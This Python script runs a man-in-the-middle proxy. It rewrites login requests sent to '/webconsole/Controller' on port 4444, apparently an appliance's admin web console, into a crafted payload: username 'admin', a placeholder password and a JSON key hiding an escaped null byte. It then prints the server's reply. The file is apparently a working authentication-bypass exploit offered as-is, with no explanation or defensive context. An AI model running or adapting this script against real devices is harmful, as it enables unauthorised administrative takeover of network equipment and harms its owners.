#! /bin/env python3
from baseproxy.proxy import ReqIntercept, RspIntercept, AsyncMitmProxy
from urllib import parse
class PostIntercepter(ReqIntercept, RspIntercept):
    def deal_request(self, request):
        if self.__is_wanted_req(request):
            origin_body = request.get_body_data()
            timestamp = origin_body.decode().split('&')[-1]
            post_data = 'mode=151&json={"username"%3a"admin","password"%3a"somethingnotpassword","languageid"%3a"1","browser"%3a"Chrome_101","accessaction"%3a1,+"mode\\u0000ef"%3a716}&__RequestType=ajax&' + timestamp
            customized_body = post_data.encode()
            request.set_body_data(customized_body)
        return request

    def deal_response(self, response):
        if self.__is_wanted_req(response.request):
            print("Response:")
            print(response.status, response.reason, sep='\t')
            print("Request Body:")
            print(parse.unquote(response.request.get_body_data().decode()))
            print("Response Body:")
            print(response.get_body_data())
        return response
    def __is_wanted_req(self, request):
        if request.port == "4444" and request.command == "POST" and request.path == "/webconsole/Controller":
            body_data = parse.unquote(request.get_body_data().decode())
            mode = body_data.split('&')[0]
            if mode == "mode=151":
                return True
        return False


if __name__ == '__main__':
    base_proxy = AsyncMitmProxy(https=True)
    base_proxy.register(PostIntercepter)
    base_proxy.serve_forever()
